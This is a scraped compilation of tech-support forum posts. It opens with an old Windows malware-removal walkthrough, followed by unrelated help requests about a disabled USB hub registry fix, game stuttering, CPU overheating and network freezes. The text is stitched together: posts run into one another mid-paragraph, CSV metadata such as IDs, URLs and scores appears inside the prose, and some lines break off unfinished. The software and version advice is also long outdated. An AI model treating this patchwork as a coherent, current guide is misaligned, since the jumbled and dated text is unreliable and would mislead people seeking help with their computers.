Before starting, if your data is valuable, **back it up**. It is ok if you backed up the malware, if worse comes to worst your operating system breaks and the computer needs to be reformatted you'll just need to install Microsoft Security Essentials or another solid antivirus BEFORE plugging your backup media back into the computer and the AV should filter any viruses. I recommend [disabling autoplay in Windows](http://support.microsoft.com/kb/967715) to prevent any infections and to also scanning the drive with [Malwarebytes Anti-Malware](http://ninite.com/malwarebytes/) before transferring.


**Symptoms of an infection**

Symptoms of malware infection range from being nearly undetectable (keyloggers) to blatantly obvious (An application that calls itself ""Vista Anti-Spyware 2012"" should sound a little suspicious).

* Security applications such as the users antivirus and firewall are disabled or fail to update.
* New programs the user doesn’t remember installing appear.
* A generic antivirus program claiming the system is infected and asking for money.
* A failure to boot in the form of either a black screen with a message about a corrupt file or the blue screen of death (BSOD) usually 0X000007B, sometimes 8a.
* The computer is slow, processor and memory usage are near full even with no applications are running.
* The user tries to browse or make a search query and is rerouted to a suspicious site.
* There are some fake antivirus variants I have seen that claim your hard drive is failing. Don't trust anything that you haven't researched. I recommend running [a real test of your hard drive](http://www.hitachigst.com/support/downloads/#DFT) if you suspect there are also hard drive issues (symptoms include slow responses, freezing, crashing, loss of internet connectivity, etc) - If this test fails you simply need to backup your data, replace the hard drive and reinstall the operating system from your recovery discs (or replacements from your manufacturer), then restore your data.


**Tools**

Please download these programs and stick them on your desktop or an easily accessible folder 

* [rKill](http://download.bleepingcomputer.com/grinler/rkill.com)

* [CCleaner](http://www.piriform.com/ccleaner/download/portable/downloadfile)
* [Combofix](http://download.bleepingcomputer.com/protected/d11a155c8fca84d005f106d9810f6464/4d19f694/ComboFix.exe)

* [Malwarebytes via Download.com](http://download.cnet.com/Malwarebytes-Anti-Malware/3000-8022_4-10804572.html?part=dl-10804572&amp;subj=dl&amp;tag=button)

* [Microsoft Security Essentials - if you only have a trial anti-virus software or you want a good replacement](http://www.microsoft.com/security_essentials)

* [My Network Settings Reset Tool](http://www.technibble.com/forums/attachment.php?attachmentid=1220&amp;d=1293371885)



**Step 1: Safe Mode**

Boot into Safe Mode with Networking by pressing F8 repeatedly during bootup. This should bring up a menu that looks like [this](http://www.pcfeeder.com/images/stories/W7_BootIntoSafeMode/SafeMode_7.png). Select ""Safe mode with Networking""



**Step 2: Run [rKill](http://download.bleepingcomputer.com/grinler/rkill.com)**

This should kill any malware processes that are still active, it'll generate a text file log which will list what it kills. It may kill any HP printer startups and some harmless items, those are fine, however if you see things like dwm.exe it's likely malware (note dwm.exe is a legitimate Windows Vista/7 file used to provide Aero transparency effects, but the malware calls itself the same so the OS points to the infected file instead of the real one).



**Step 3: Run [CCleaner](http://www.piriform.com/ccleaner/download/portable/downloadfile)**

This will remove temp files where some some of the malware reside.




**Step 4: Run [Combofix](http://download.bleepingcomputer.com/protected/d11a155c8fca84d005f106d9810f6464/4d19f694/ComboFix.exe)**

Follow [This guide](http://www.bleepingcomputer.com/combofix/how-to-use-combofix) on how to use Combofix. NOTE THAT COMBOFIX WILL TSA YOUR COMPUTER AND MAY IN RARE CASES BREAK YOUR OPERATING SYSTEM-PROCEED WITH CAUTION-OTHERWISE OPT-OUT AND GO TO STEP 6.
Combofix now also supports 64-bit operating systems! =)




**Step 5: Reboot and boot into Safe Mode [F8 key at startup] Again**

You will need to reboot after Combofix completes otherwise .exe files won't run.




**Step 6: Install and run [Malwarebytes via Download.com](http://download.cnet.com/Malwarebytes-Anti-Malware/3000-8022_4-10804572.html?part=dl-10804572&amp;subj=dl&amp;tag=button)**

This is pretty straightforward, simply install it, update it, and run a full scan of the OS. This may take up to a few hours depending on your system.



**Step 7: Check your Antivirus and do a Full scan**

If you have an expired antivirus that came with your computer or you don't trust the one you have, I recommend downloading and installing Microsoft Security Essentials, it's free and has pretty good detection rates, however AV-test.org in Q1 gave it a pretty low detection rating. MSE 2.0 won't catch everything, but keep in mind no antivirus is, and none of them can make up for safe surfing habits and updates to plugins and the operating system. If you want more protection, you could support the developers and buy a full copy of Malwarebytes which includes the real-time protection components. If MSE isn't your cup of tea (it will take a lot of RAM and slow down the older gen netbooks that have &gt;=1GB of RAM) you can try any of the other AV's offered out there. For the free ones I recommend Avira followed by AVG. In terns of paid protection, Kaspersky is a well recognized and well respected AV, personally if I had the money to spend I'd use it (note that its very paranoid but it will keep your computer pretty safe).



**Optional: Run another Second Opinion Scanner**

* [Hitman Pro](http://www.surfright.nl/en/downloads/)

* [SuperAnti-Spyware](http://www.superantispyware.com/downloadfile.html?productid=SUPERANTISPYWAREFREE)

* Some people suggest Ad-Aware and Spybot. We can party like it's 2004 or use programs that actually remove malware. I view those as old-gen tech that had their glory days and no longer have what it takes to protect the computer. If you or whoever you are helping feels they provide an extra sense of security there's no harm in installing them (note however that on older machines they may just take up more RAM and slow the system down).



**Step 8: Network Settings Reset**

The Network Settings Reset tool will remove any hardcoded IPs, DNS redirects, proxies that the virus may use. 


**Step 9: Change your passwords!**

There are some nasty trojans out there like zBot which will steal your passwords, credit card numbers, etc and send them off to people in other countries, these people are interested in the redistribution of your wealth (or lack thereof). If you paid the fake antivirus with your credit card, cancel the card. As a precaution I would recommend changing your login passwords, make sure they have characters with at least one lowercase, uppercase, symbol, and number, for a good guide check out this [XKCD comic](http://xkcd.com/936/).
Don't use the same login username and passwords for every site If they found your gmail username and password perhaps you use it for your PayPal or Amazon account as well.


If you are sure you have been a victim of ID theft please visit [The FTC's site on ID theft](http://www.ftc.gov/bcp/edu/microsites/idtheft/) for assistance.



**Step 10: Secure your Computer**

Make sure you run Windows Update and the latest service packs are installed and your firewall is enabled, the Antivirus is updating and not expired, Make sure Firefox/Java/Adobe/Flash are updated, if not, run the individual installers or batch install them using [Ninite](http://ninite.com).

To see which version of the programs you have simply go to Start (orb) | Run | type ""appwiz.cpl"" which will take you to the Add/Remove panel (Program and Features in WinV/7)

**Programs and Plugins with Security vulnerabilities**

* Java: Version 6 Update 32 (as of 6/
* Adobe Reader: Version 10.x
* Adobe Flash: 10.x

Anything short of Java version 7 (eg version 6 update 26 is probably going to get you reinfected, as each new version patches multiple vulnerabilities discovered in the previous version).

For a complete list of what needs updating run the [Plugin Check](http://www.mozilla.com/en-US/plugincheck/) for all browsers.

**Windows Service Packs**

Here's a [link](http://windows.about.com/od/windowsosversions/ss/Determine_Vista_Version_Service_Pack.htm) to determine which version service pack you may have.

* XP: Service Pack 3
* Vista: Service Pack 2
* 7: Service Pack 1 (this is optional, so you have to check Windows Update yourself to install)

If you are still infected you may have a Master Boot Record (MBR) Virus (however ComboFix should have removed it) More information on how to remove an MBR virus can be found on my forum post [here](http://www.technibble.com/forums/showthread.php?p=173778#post173778).


**Advanced Tools**

* [Autoruns](http://live.sysinternals.com/autoruns.exe)
* [Process Explorer](http://live.sysinternals.com/procexp.exe)
* [GMER](http://www.gmer.net/)
* [TDSSKILLER](http://support.kaspersky.com/downloads/utils/tdsskiller.exe)

* [OTL](http://www.geekstogo.com/2010/05/27/otl-by-oldtimer-a-modern-replacement-for-hijackthis/)


**For the paranoid**

I'm going to guess by now at least someone has a bone to pick since I didn't mention getting a third party firewall. I don't feel the need to have a 3rd party firewall because the one built into Vista/7 already covers both outbound and inbound but there are tons out there people have felt have kept them safe. My take is to each his own, just make sure the infection hasn't broken its rules or its overall functionality.

There is also something that blacklists known bad IP servers called PeerBlock, which a lot of people use to prevent third-party copyright agencies from catching people who torrent. As an added benefit from the P2P blocklists there are also malware blocklists, so check that out. Note that at times an IP you need may be blocked (eg if you checked Educational Institutions as a blocklist to include during setup and you can't access the internets while on campus). There are forums on the peerblock website you should check out for detailed questions there.

ek8bn,"TeamViewer is an awesome free (for personal use) software to fix remote computers (not affiliated with the site, just a happy user).","Things I learnt today:

1. TeamViewer ( http://www.teamviewer.com ) is free and works beautifully, even across slow, high-latency intercontinental networks.

2. Skype has a screen-sharing option that works beautifully. Why they don't add a remote-control feature to that is beyond me.

3. McAfee can bring anything down to its knees. MSE + SpyBot is my preferred solution.

I'm in Florida, my parents are in Kolkata India. My mom's brand new laptop was loaded with so much crapware that it was unusable. Despite having 2GB of RAM and a fast CPU it was crawling. I've used LogMeIn before but it wouldn't install on her laptop. I used Skype's screen-sharing option to see what she was seeing (some error about ""The system cannot find the file specified"") and figured installing some other software would be better.

TeamViewer was a quick/easy download. Once we got TeamViewer working, I took over and for the past 4 hours have been removing crap from her laptop. It is like a brand-new laptop already. TeamViewer doesn't require you to create an account or give out your email. Download software at both ends, enter the remote PC's ID &amp; pin and you're good to go.

**Troubleshooting**

 * Can't access windows? - Try using [Avira AntiVir Rescue System](http://www.avira.com/en/support-download-avira-antivir-rescue-system) to install AV programs or fix possible issues restricting you from booting into windows.

 * Check proxy settings if your browser cannot access the internet. [Firefox](http://www.ehow.com/how_5828352_reset-mozilla-firefox-proxy.html) proxy reset.

 * Getting programs on PC without internet connection - Easiest solution is to place programs on a usb flash drive.

 *  AV Programs wont run? - Try changing the name of the program or try running in [Safe mode](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/boot_failsafe.mspx?mfr=true)

 *  Google redirect virus. - [Use Kaspersky Rootkit removal tool](http://support.kaspersky.com/viruses/solutions?qid=208280684)(TSDD Killer) or [Hitman pro](http://www.surfright.nl/en/products/)
 

**Anti-Virus** - Make sure any programs used are fully updated.

* Scanning - Some programs work better when scanning in safe more however this is not always the case, Try running AV scans in normal windows or scan in safe mode if the infection is preventing that, Once safe mode scanning and removal of infections are complete run again in normal windows boot mode.  ""How do I safe mode?"" - [Safe mode instructions](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/boot_failsafe.mspx?mfr=true)

* [CCleaner](http://www.piriform.com/ccleaner)
* [Revo Uninstaller](http://download.cnet.com/Revo-Uninstaller/3000-2096_4-10687648.html?tag=mncol;1)

**COMBOFIX**

Guide for using [Combofix](http://www.bleepingcomputer.com/combofix/how-to-use-combofix) - However, You should not run ComboFix unless you are specifically asked to by a helper. Also, due to the power of this tool it is strongly advised that you do not attempt to act upon any of the information displayed by ComboFix without supervision from someone who has been properly trained. If you do so, it may lead to problems with the normal functionality of your computer. 
 

**Prevention** 

The best way to prevent future infections is to keep a AV program running like    

* [Avira AntiVir Personal](http://www.avira.com/en/free-download-avira-antivir-personal)
* [Microsoft Security Essentials](http://www.microsoft.com/security_essentials/)(Very popular **FREE**)
* [Kaspersky](http://usa.kaspersky.com/) **Not Free**
    
If your using Firefox these addons will help against future infections.
  
* [WOT Safe browsing addon](https://addons.mozilla.org/en-US/firefox/addon/3456/)  
* [Adblock Plus](http://adblockplus.org/en/installation) is also a very popular choice for eliminating ad's if your visiting questionable sites or just protecting grandma from literally surfing the web ad to ad and don't have a problem with not giving sites revenue for ads but that's more a personal choice. 
* [NoScript addon](http://noscript.net/) for FireFox makes it difficult for a website to execute JavaScript, Java and Flash and other plugins without your permission. 

**Backup your data!**

I've Been a fan of [Acronis](http://www.acronis.com/) backup software but I know there are others available so I will try to search them out.

**All Is Lost, What now?**

Many people suggest a re-install of windows if it has ever been infected as there is really no way to get the system exactly back to pre-infection. If you do decide to reformat the drive and or re-install windows or OS of your choice and make sure to download all updated for your OS as well as Java, Adobe, Browser and AV.

* [Ninite](http://ninite.com/) Allows you to download pre-batched software for easy installation including, Browser, Anti-virus, Java, Itunes, CCleaner, Revo Uninstaller ect.

I live in a pretty rural area with very limited access to Internet. There is only a single provider, and that provider only provides dsl. That dsl is pretty spotty, and obviously not very fast. I’m thankfully able to get up to 20mb download, but for someone who works at home, that is not a lot. 

I’m hoping there is some solution to bond two Internet connections together? I am considering buying a second contract for the 20mb, and hopefully combining them to achieve near 40 coming out over my WiFi.

For example, it happens if I use Windows Photo Viewer (the classic one, not the new ""Photos"" app) but not on the Photos app.  It shows up on Chrome and Opera, but not on Firefox or Edge. Even in Windows Photo Viewer, the problem disappears if I enter slideshow mode.

One thing that I noticed is that Windows got an update once I got back. I wonder if it could be related. I already updated GPU drivers since there to no avail. I wonder if this is a GPU problem (I'm moving away from the country where I bought mine in 2 months so if it is I should return it fast) or just Windows doing Windows stuff.

Here's an example of the issue: [https://i.vgy.me/Mceyub.jpg](https://i.vgy.me/Mceyub.jpg)

Edit: Now when I checked the comparison picture, the problem also happens in Firefox. But not in Edge. This is confusing.

Edit2: In my girlfriend's computer (also fully updated Windows 10) the issue doesn't happen, regardless of software/browser so I'm more inclined to believe the GPU is at fault here.",https://www.reddit.com/r/techsupport/comments/chuomx/pixel_bleed_effect_gpu_problem/,1564094467.0,76,0.94,26,techsupport,TheSpaceDuck

cgqzte,Great hardware and 60 FPS but games are stuttering - What is wrong with my PC?," Hello,

&amp;#x200B;

I  have the following problem: I upgraded my GPU to a better card and my  games run worse than before even on the lowest settings. I'd guess that  my CPU could be a reason but I just can't believe that it has such a  huge impact.

&amp;#x200B;

My current build:  
**MOBO:** AsRock B450 Pro 4  

**CPU:** Ryzen 5 1600  

**GPU:** Asus RX 5700 XT  

**RAM:** 2x 8GB DDR4 3000 Mhz  

**DISK:** SSD (500 GB - Windows), SSD (1 TB - Games), HDD (2TB - User Folders, Documents, Small Games, Other Files)  

**PSU:** Thermaltake Smart RGB 600W  

**MONITOR:** 1080p / 60 fps (Benq RL2455HM)

&amp;#x200B;

I had a ""Powercolor RX 480 8GB"" before and many of my games run now even worse with the same settings.  
For  example: GTA5 and Rust both have a problem with microstuttering. Even  when i turn the graphics settings to ""low"" i'll get fps drops sometimes  and experience microstuttering. On Rust i have 60 FPS but still get  microstuttering in Borderless and Fullscreen mode even on the lowest  possible settings.

&amp;#x200B;

What i tried so far / What i checked:  

\- GPU temperature: rarely above 80°C, usually between 70 and 75 degrees even after playing for an hour.

\- CPU temperature: usually between 60 and 70°C

\- GPU/CPU load: GPU load was never higher than 70%, CPU load was rarely higher than 40%

\- Yes, my monitor is connected to the GPU

\-  Before installing the new card i uninstalled the old drivers with DDU and installed the latest drivers (19.7.2) manually. I already tried to  re-install the drivers again with version 19.7.1, no difference

\- No  wattman modifications have been made when i tested these games. Undervolting the card a little bit gave me a small performance boost and  better temps, but everything is on default currently.

\- Overclocking the CPU from 3.2 Ghz to 3.6 Ghz didn't change anything.

\- All my devices are being listed correctly in the device manager  


I'm not sure if i tried / checked more things but if yes i'll add it in the comments.  
If i forgot to mention something feel free to ask!

&amp;#x200B;

So, what should i try now? What could be the problem?

&amp;#x200B;

Thank you very much for any help!

cfycp7,Laptop shuts off at random intervals while playing more graphically demanding games.,"       I got an ASUS GAMING FX504GM series laptop back in March, and it works like a charm. I Primarily use it to play RuneScape, and it has no problems with that (obviously). Problems arise when I play more graphically demanding games, the only ones I've had a problem with were Killing Floor 2 and Dark Souls 3.
       Killing floor 2 would shut off my laptop much quicker, and has a graphics options for gibs/fluids. After i disabled it, the game has never shut my laptop off again, and i never noticed the laptop overheating at all. So problem solved right?  Not exactly...
        Dark souls 3 is a different beast it would seem. It tends to take much longer to cause the laptop to shut off, regardless of what i change the graphics settings to (normally at least a couple hours, sometimes as little as 20 minutes).
        I have played Monster Hunter World on it only once for a couple hours on medium settings, and never had any issues whatsoever. I have also updated my bios to the most current one, and have also tried undervolting my cpu. Anyone have any suggestions? I would really appreciate it!

Specs:
Os-Windows 10 64 bit
Ram-16gb
Cpu-I7-8750H 2.20 ghz
Gpu-gtx 1060

Edit: I have used a program called ThrottleStop and selected an option called ""disable turbo"". This lowered my max clock speed of my cpu to 2.2 ghz, and has kept the temperature slightly cooler than what it normally is.

cfl0me,RAM Frequency halved after today's Win10 Update according to task manager,"So  I did the new ""big"" update on Windows 10 today (one of those that take  quite some time) and noticed that my RAM is suddenly shown in Task  Manager as running at 1600MHz, half of the 3200MHz I have it set at.  Now, of course I checked the BIOS which showed it at 3200. To test it I  set in in the BIOS to 1600, and then Task Manager showed it as 800. ( I  set it back to 3200 after that).

Digging deeper, Command Line (   *wmic MemoryChip get BankLabel, Capacity, MemoryType, Speed, Tag )* shows it running at 3200 MHz, as it should be :

BankLabel  Capacity    MemoryType  Speed  Tag

Channel A  8589934592  0           3200   Physical Memory 1

Channel B  8589934592  0           3200   Physical Memory 3

So I ran UserBenchMark which also Includes a RAM check, showing 1600 again.

cencrk,"I broke Windows in the stupidest imaginable way, please help me","**Edit:** Solved!!! Thank you so much /u/Sezhe and /u/stoopid_monkey254 I really thought it was curtains there hahahahahaha

On the off chance that someone ever does this and stumbles on this thread in seventy years, here is a consolidated version of what I had to do. Unless you disabled the exact same drive as me (""Generic USB Hub""), it won't *exactly* fit what you need to do, but it should give you a better idea. It involves fucking with your registry, so if you're unfamiliar with that please be very careful!!!

The problem this solves is the mistake of going into Device Manager and disabling a device called ""Generic USB Hub"". This disabled your USB ports, leaving you unable to use your mouse or keyboard to re-enable that device!

**Note:** Before you get into this stuff, see if your computer has a PS/2 port. If you're not sure what that looks like, Google it. It's a real old looking port that peripherals like mice and keyboards connected to in like, the 1740s. That port will bypass USB input, so if your PC has one of these ports and you can get your hands on a mouse that fits in it, you can probably use that mouse to re-enable the device. If your computer has no PS/2 port, welcome to Hell! Please read on!

**1.** I booted Windows into Recovery mode. This is a barebones blue screen, with buttons on it, so if you get to that you're on the right path. One can get to Recovery by booting from a USB drive that has Windows' Recovery stuff burned onto it in advance, but I ... Couldn't figure out how to do that, frankly.

So, uh, if you're also having problems with the USB drive thing, Google methods of getting into Windows Recovery! I'm using Windows 8.1, and I'm not positive of this method's efficacy on other versions, but I was able to get into it by:

Holding the power button to shut my laptop off, then, turning it back on. Then, *while* Windows was booting, I held the power button to shut off the laptop again and interrupt the boot process. This is kind of aggravating and could take a couple tries. Make sure you don't hold the power button during the screen that shows your laptop's manufacturer, like ""ASUS"" or ""Intel"", etc. There should be a Windows boot screen while you're holding down the power button. Once the laptop has turned off a 2nd time ... Go ahead and turn it back on

If you've done it right, Windows shouldn't boot normally! It should say something like ""Please wait"", and take you to the aforementioned blue screen, with some junk about how Windows couldn't start properly. Welcome to Windows Recovery! You'll find that the mouse and keyboard probably work here! Huzzah! There is still more to do, though, for them to function in the normal Windows environment

**2.** You will probably see 2 buttons that say ""Restart"", and something like ... ""Advanced options"". Click the advanced options. You should see buttons that say things like, ""Continue"", ""Troubleshoot"", ""Turn off your PC"".

Now, the exact buttons might vary between, say, Windows 8 and 10, so I'm hesitant to just spell out exactly what buttons you need to click. but the gist is: You need to be going *deeper* into Windows recovery to find more options. Just for a few clicks. Don't continue to Windows, don't shut off your computer, don't ""refresh"" or ""reset"" your computer. Just click ""Troubleshoot"", and if from there you see ... ""Advanced options"", again, click that. That's all it takes on 8.1. 

You should end up at a screen with ... 5 or 6 options, it looks like this https://i.imgur.com/AbZWHyz.png

**Before you go any further, try System Restore! See if you have any Restore Points. They might take you back to before you disabled that device, and end this whole thing. If you're like me, and you have no Restore Points, just hit ""Cancel"" and read on. If you *can* do a System Restore, and it doesn't fix the problem for some reason ... Just follow the guide back up to this point, I guess.**

Anyway, I stole that screenshot from a YouTube video where the guy had ""Command Line"", circled, which is convenient because, assuming a System Restore didn't work, you're gonna want to click on Command Line. Click on Command Line!

**3.** A black window should open. This is Command Line. If you're totally unfamiliar, this is how you interact with your computer through nebulous text-based commands instead of clicking on things, or typing in lots of different boxes. Fortunately, I'm going to tell you what commands you need to type in. Please type them verbatim, and check carefully for typos! They're very short and simple, though, so you're probably going to be fine

First, you need to know what hard drive you have Windows installed in!

Hard drives are usually denoted by a single letter with a colon after it, like A: or B: or C: or D:. In most cases, the hard drive Windows is installed on is labeled C: by default. This is probably the case for you. But, if you'd like to be *sure* that Windows is installed on C:, *or,* if you'd like to see all the available hard drives in order to *locate* the one with C: on it, you can use Command Line to do that

**You can skip the following section if you're reasonably sure which hard drive you have Windows installed on**

Type the following command, and hit enter

&gt;wmic logicaldisk get name

This should list every available drive. To test which of these has Windows on it, you need to ""switch"" to each of these drives, and run this command on it:

&gt;dir

To ""switch"" to a drive, you just type its name. Like this: 

&gt;c:

Or

&gt;d:

So just go down this list like so. Your commands should go like ...

&gt;a:

&gt;dir

&gt;b:

&gt;dir

&gt;c:

&gt;dir

Only, you might not have an a: drive or a b: drive. Just modify this process to include the drives that were listed before

Each time you use ""dir"", a list should come up. What you're looking for is a list that has stuff like ... ""Program Files"", or ""Program Files (x86)"". These are folders in the top level of your hard drive. These folders won't be relevant to fixing your computer, but they are the indicators that you are indeed on the right hard drive. So, if you do ""dir"" and see these folders, you are on the right drive.

**End of possibly skippable section**

So, if you're confident that Windows is installed on C:, go ahead and type this, then hit enter:

&gt;c:

Great! Now we're going to open the program that you're going to use to fix your computer. Just type the following:

&gt;RegEdit

Voila! A new window opens. Welcome to RegEdit! Now you get to click on stuff again! Goodbye, Command Line.

**4.** Welcome to RegEdit. It's kind of an insane labyrinth of folders. But, it's going to let you dig around in your computer's guts and flip that device's switch back to ""on"", since you can't do it the easy way. I'll tell you what you need to do

***Please* don't go all willy nilly in this program.** You're safe to navigate around it freely but, hold your horses on anything that involves opening a right-click menu, ok?

You should see 2 panels. The one on the left shows a series of folders. Probably something like:

HKEY_CLASSES_ROOT ... and, HKEY_CURRENT_USER ... and, HKEY_LOCAL_MACHINE ... and, HKEY_USERS ... and, HKEY_CURRENT_CONFIG

Give HKEY_LOCAL_MACHINE a single click, to select it. Then, on the top bar of the program, click ""File"". Then, click ""Load Hive""

A file browser window will come up. This is how you'll select the Hive you need to load. Click ""This PC"" on the left. Click on C:, or whichever hard drive you have Windows on, probably C:. In this window it might have the name OSDisk. It's probably C:!

Now, navigate into this series of folders: 

&gt;Windows

&gt;System32

&gt;config

In the folder ""config"", you're looking for a file called ""SYSTEM"". There are *two* files with this name. One is a text file, the other is just a ... ""File"". Unlabeled. You want to select the file that is ***not*** a text file. Then click ""Open"".

The file browser window will close, and you'll be back on RegEdit. A window will come up, asking you to assign a name to the Hive you just loaded. Type *anything* into this box, like ""blah blah blah"" or something, then click Ok.

Click on the arrow next to HKEY_LOCAL_MACHINE, to uncollapse it and reveal its contents! You should see several folders with names like HARDWARE, SAM, SECURITY, SOFTWARE, and SYSTEM. One of these folders should be named after the text you type in, ""blah blah blah"" or what have you. Uncollapse this folder

Keep uncollapsing folders and follow this path:

blah blah blah --&gt; ControlSet001 --&gt; Enum --&gt; USB

You should see lots of folders with names that follow this general pattern:

VID_8087&amp;PID_0020

VID_10C4&amp;PID_8105

In all of the folders that follow this name scheme, you can find at least two (maybe one?) folders. Each of these folders has an even more gibberish name, such as: 5&amp;35f39389&amp;0&amp;1

**These folders with even more gibberish-y names are what you need to sift through.**

Up until this point, you've had no reason to care about the information being displayed on the right side of RegEdit as you navigate. Now is when you're gonna need to start looking at that stuff

What you want to do is uncollapse all of the folders inside Enum\USB, and start looking at those folders that are the most gobbledegooky in name. Each time you highlight one, a list of different features will appear in that right panel. Within the right panel, these consist of certain labels on the left, and what those labels are set to, on the right

You're only going to be concerned with **two** labels, and you're only going to need to edit **one.**

**Please note that this is where you may have to trailblaze a bit.** I can't guarantee that you disabled the *exact* same device as I did. But I'll explain the labels you're looking for

The first label is called **ConfigFlags.** You'll notice that this is set to **0** a lot. The value of it is represented in hexadecimal (Like this: 0x00000000), but it always has a decimal value at the end in parentheses. Just look at the decimal value to keep it simple

If you see a folder that has **ConfigFlags** set to specifically **1**, *you should look at the other relevant label to cross-reference them and make an educated guess as to whether this is the device you disabled.*

The second label is called **DeviceDesc.** Below is an example of just one thing DeviceDesc might be set to:

&gt;@usb.inf,%usb\class_09.devicedesc%;Generic USB Hub

As you can see, gobbledygook but with a clearly readable device name appended at the end there. You might have to drag the ""Data"" tab in RegEdit out a bit so there'll be room to display all the text

**So.**

All the pieces are in place. You want to find something with **ConfigFlags** set to **1** and a feasible **DeviceDesc** for it to *be* the device you disabled. This will, of course, be easiest if you recall the act of disabling it, y'know, what you right-clicked just before doing so

If you think you've found the device, just right-click ""ConfigFlags"" and click Modify. Make sure the Base option is still set to ""Hexadecimal"", and type **0** into the field. Then click Ok

**Again, I strongly caution against editing any values except for ConfigFlags! And even then, I would be discerning about what you change! Messing with the registry can mess Windows up to a degree far worse than just lost USB functionality!** To be fair, I'm not *entirely* sure how much damage you can do in this part of the registry, exactly, but I am not that versed in RegEdit so, like a caveman terrified of an automobile, I will just tell you to use lots of caution

Anyway, if you think you've gotten it taken care of, reboot your computer, and hopefully you'll have USB functionality again! Good luck.

This happened while I was trying to fix an issue on Windows 8.1, where no keyboards were working on my laptop, something messed up about their drivers

While messing with Device Manager and trying to fix this, I made the grave mistake of disabling the ""Generic USB Hub"" device. This disabled all USB ports, preventing me from even using my mouse to do anything, such as re-enable the godforsaken ""Generic USB Hub device""

I held the power button and restarted, hoping the device might re-enable, but it did not. I am now completely incapable of interacting with anything once the Windows login screen comes up

My only options seem to be the laptop's BIOS, and the Windows troubleshooting menu I can access by holding the power button while Windows is booting. I haven't found anything thus far in these menus that will alleviate this, though

I've tried booting into Safe Mode, but the driver is still disabled there, so it's still uninteractive

I also have no system restore points

My laptop does not have a PS/2 port, so that doesn't seem to be an option either

ccu351,"PC will no longer boot, it did this after extreme thermal throttling for seemingly no reason.","I5 3570 CPU
2x4GB DDR3 Corsair Vengeance 1600MHz RAM
ASUS P8H61-I LX/RM/SI Motherboard
Alpine 12 CPU Fan
Corsair VS450 PSU
GTX 750 Ti

Ok so yesterday, I upgraded my I5-2500 to an I5-3570, initially on boot it blue screened, no big deal, i reset the PC and it booted fine. I then booted up cinebench R15, did some tests, the CPU appeared to be running ok. The next day I boot the thing up again, try playing some light gaming, csgo, the thing runs horribly, even at minimum settings,which was seriously concerning seeing as how this was supposed to be an upgrade, and before i upgraded my cpu it was running smoothly at 60fps. So I look in CPUID and low and behold my CPU is reading 105 degrees! I've never seen a CPU that hot.

I naturally immediately turn the machine off. Then leave it to cool.

I turn it back on and... it doesn't even post. The fans turn on, yes, but no BIOS screen, no nothing.

So I think, hey maybe the CPU just died, so I pull out my old I5 2500, and install that a fresh. Still doesn't boot, again, no beeps, no BIOS screen no nothing.

I also notice that when swapping CPUs, despite, well having only just tried to boot with the other one, it was HOT to the touch, after having only run for well, 3 seconds. 

Now, another thing to mention, the last time I had this issue with this same PC btw, it was the PSU that had blew, as in no bootup at all even with fans spinning.

I tried the usual solution, changing cables, reseating the RAM, reseating other stuff. But it didn't work.

Please help, I've already wasted a whole bunch of my money on this PC I saved up from work and if my family finds out this thing broke they'll forever look down on me because of it seeing it as a waste of money.

c3q6lm,Incredibly desperate. Computer completely freezes when connected to the internet.,"My laptop freezes completely, and by completely I mean COMPLETELY. I can't open task manager, the pc will not react to any button I press except for the power button. Sometimes when it freezes I leave it on to see if it'll eventually unfreeze itself, and the laptop will literally stay the way it is until the battery dies. This is how I am sure it has something to do with internet connection:

1. Uninstalled antivirus a long time ago. Still freezes. 
2. All drivers are up to date, including the network adapter. Still freezes. 
3. At first I thought it had something to do with Chrome. So I used Firefox instead of Chrome for a while. Still froze. 
4. Next I thought it had something to do with connecting to a Microsoft acct on log-in. Switched to a local account and it still freezes.
5. Tested it by just turning the pc on and connecting to wifi. Did nothing at all, no programs needing internet running on start-up, and it still froze. 
6. It NEVER freezes when I disconnect from wifi. When I use my pc without connecting to wifi I can use it for as long as I want without it ever freezing. If I connect to the internet I can expect it to freeze from immediately after logging in and reaching the desktop to at most two hours of use. When it happens is random. 

The only fix I can do when it freezes is to turn it off with the power button, turn it on again, and then shut it down properly before turning it on again. Rinse and repeat. 

So what do you think folks? Is it hardware? Does my network card need replacing? Are there other tests that I should try? I'm at my wit's end here, I'd greatly appreciate any help.

CPU: Intel Core i7-9700K CPU @ 3.60GHz

Motherboard: Gigabyte Technology Co. Ltd. Z370M DS3H-CF (U3E1)

SSD: HP SSD EX900 500GB

HDD: Western Digital Blue 2000GB, 5400rpm, 3.5"", 64MB, SATA3

==========================================================================

I bought a new PC, it was custom built by a company, parts were chosen by request. PROBLEM: When playing certain games (GTA V, CSGO) after a while the PC freezes, the sound does NOT get stuck, nothing special, just freezes on a still image. Only way to resolve the freeze is to hard restart the PC with the button on the case. Have tried waiting for a while to see if the game would unfreeze, it doesn't. As far as I could tell the system does not overheat and does not lack the power to run these games, the CPU/GPU usage is always stable and relatively low, I checked the temperatures using Speccy and they all were 30-40C.

Other certain games I have tried to run (Minecraft, League of Legends) did NOT cause a freeze. I have tried several solutions while trying to figure this out myself: I ran a RAM diagnostics (no errors found), updated windows, updated drivers, increased virtual memory. Increasing the virtual memory seemed to elongate the time it takes for a game to freeze, instead of freezing in \~10mins, it takes 20-30mins. (I increased virtual memory from the default \~3GB to 20GB).

&amp;#x200B;

PLEASE HELP

\[EDIT\] Will try contacting the company that assembled the PC for a PSU test. If found to be the problem, will change the PSU and possibly the motherboard.

&amp;#x200B;

*Link to your Lenovo model computer:*

[*https://www.lenovo.com/us/en/desktops/thinkcentre/m-series-tiny/m73/*](https://www.lenovo.com/us/en/desktops/thinkcentre/m-series-tiny/m73/)

*Link to Encompass requirements:*

[*http://help.elliemae.com/DocumentationLibrary/360/SystemRequirements.pdf*](http://help.elliemae.com/DocumentationLibrary/360/SystemRequirements.pdf)

*Scroll to page 3 for Encompass. You can see all 3 versions require a minimum of i3, i5, or i7 at 2.8 GHz. Your processor is a lower tech and only at 2.6 GHz.*

*Link CPU Performance Benchmarks:*

[*http://www.cpu-upgrade.com/CPUs/Intel/Pentium\_Dual-Core/G3220T.html*](http://www.cpu-upgrade.com/CPUs/Intel/Pentium_Dual-Core/G3220T.html)

*Scroll all the way to the bottom chart. You will see the i7’s down to i3’s at the top. All the way at the bottom is the G3220T, 3rd from last on the chart.*

*The CPU is running harder and hotter than it should to keep up and still not able to meet the performance of the program which will cause lag and crashes during use. It also will shorten the life of the CPU by constantly running it at that level.*

&amp;#x200B;

